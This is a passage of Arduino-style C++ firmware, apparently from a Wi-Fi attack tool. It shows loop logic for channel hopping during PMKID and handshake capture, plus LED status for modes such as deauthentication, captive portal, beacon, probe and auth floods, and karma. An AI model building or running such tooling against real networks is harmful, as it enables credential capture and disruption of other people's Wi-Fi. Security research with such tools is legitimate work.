    state.lastChannelHop = now;
    if (state.pmkidActive)
      state.pmkidData = String("Hopping CH ") + String(state.targetChannel);
    if (state.handshakeActive)
      state.handshakeData = String("Hopping CH ") + String(state.targetChannel);
  }

  if (state.pmkidActive && !state.channelHop && now - state.lastPMKIDCheck > Config::PMKID_TIMEOUT) {
    if (state.eapolCount == 0) {
      state.targetChannel = (state.targetChannel % 13) + 1;
      wifi_set_channel(state.targetChannel);
      state.pmkidData = String("No EAPOL - trying CH ") + String(state.targetChannel);
    }
    state.lastPMKIDCheck = now;
  }

  bool anyActive = state.deauthActive || state.pmkidActive || state.portalActive ||
                   state.snifferActive || state.handshakeActive || state.beaconFloodActive ||
                   state.probeFloodActive || state.authFloodActive || state.karmaActive;
  if (anyActive) {
    if (now - state.lastBlink >= Config::LED_BLINK_INTERVAL) {
      digitalWrite(Config::LED_PIN, !digitalRead(Config::LED_PIN));
      state.lastBlink = now;
    }
  } else {
    digitalWrite(Config::LED_PIN, HIGH);
  }

  if (now - state.lastWatchdog >= Config::WATCHDOG_TIMEOUT) {
    Utils::feedWdt();
  }

  yield();
}
